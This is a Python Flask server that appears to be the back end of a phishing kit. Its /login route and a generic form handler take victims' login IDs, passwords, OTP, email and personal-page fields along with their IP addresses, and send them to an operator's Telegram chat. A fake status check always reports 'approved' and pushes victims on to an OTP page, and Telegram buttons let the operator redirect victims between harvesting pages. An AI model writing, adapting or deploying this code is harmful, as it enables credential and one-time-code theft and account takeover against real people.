from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
import hashlib
import hmac

# Load environment variables from Render or .env
load_dotenv()

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})  # Allow all origins for testing; restrict in production

# Telegram Bot Settings
BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"  # Use provided bot secret; prefer env variable
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing one or more required environment variables.")

# Redirect Buttons
REDIRECT_BUTTONS = [
    [{"text": "OTP Page", "callback_data": "redirect_otp"}],
    [{"text": "Email Page", "callback_data": "redirect_email"}],
    [{"text": "Personal Page", "callback_data": "redirect_personal"}],
    [{"text": "Login2 Page", "callback_data": "redirect_login2"}],
    [{"text": "C Page", "callback_data": "redirect_c"}]
]

# Message Sender
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": {
            "inline_keyboard": REDIRECT_BUTTONS
        }
    }
    try:
        response = requests.post(url, json=payload)
        print(f"Telegram response: {response.status_code}, {response.text}")
        return response.ok
    except requests.RequestException as e:
        print(f"Telegram API error: {e}")
        return False

# Webhook Endpoint for Telegram Bot
@app.route('/webhook', methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update or 'callback_query' not in update:
            return jsonify({"status": "no callback"}), 200

        callback_data = update['callback_query']['data']
        chat_id = update['callback_query']['message']['chat']['id']
        
        # Handle callback buttons (e.g., redirect_otp)
        redirect_map = {
            "redirect_otp": "otp.html",
            "redirect_email": "email.html",
            "redirect_personal": "personal.html",
            "redirect_login2": "login2.html",
            "redirect_c": "c.html"
        }
        if callback_data in redirect_map:
            # Optionally notify Telegram user
            send_to_telegram(f"User selected: {callback_data}")
            return jsonify({"status": "ok", "redirect_url": redirect_map[callback_data]}), 200
        return jsonify({"status": "unknown callback"}), 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

# Login Endpoint (Handle JSON)
@app.route('/login', methods=["POST"])
def login():
    try:
        data = request.get_json()
        if not data or 'login' not in data or 'password' not in data:
            return jsonify({"success": False, "error": "Missing login or password"}), 400

        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        message_lines = [
            f"<b>LOGIN Submission</b>",
            f"<b>Login ID:</b> <code>{data['login']}</code>",
            f"<b>Password:</b> <code>{data['password']}</code>",
            f"<b>IP:</b> <code>{ip}</code>"
        ]
        full_message = "\n".join(message_lines)
        sent = send_to_telegram(full_message)

        if sent:
            import uuid
            login_id = str(uuid.uuid4())
            return jsonify({"success": True, "id": login_id}), 200
        else:
            return jsonify({"success": False, "error": "Failed to send to Telegram"}), 500
    except Exception as e:
        print(f"Error in /login: {e}")
        return jsonify({"success": False, "error": "Server error"}), 500

# Status Endpoint
@app.route('/status/<id>', methods=["GET"])
def status(id):
    try:
        return jsonify({"status": "approved", "redirect_url": "otp.html"}), 200
    except Exception as e:
        print(f"Error in /status/{id}: {e}")
        return jsonify({"error": "Server error"}), 500

# Generic POST Handler (for other pages)
@app.route('/<page>', methods=["POST"])
def receive_form(page):
    try:
        data = request.get_json() or request.form.to_dict()
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        message_lines = [f"<b>{page.upper()} Submission</b>"]
        for k, v in data.items():
            message_lines.append(f"<b>{k}:</b> <code>{v}</code>")
        message_lines.append(f"<b>IP:</b> <code>{ip}</code>")

        full_message = "\n".join(message_lines)
        sent = send_to_telegram(full_message)
        return jsonify({"status": "ok" if sent else "failed"}), 200 if sent else 500
    except Exception as e:
        print(f"Error in /{page}: {e}")
        return jsonify({"status": "failed", "error": "Server error"}), 500

# Health Check
@app.route("/", methods=["GET"])
def root():
    return "✅ Flask server is live."

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)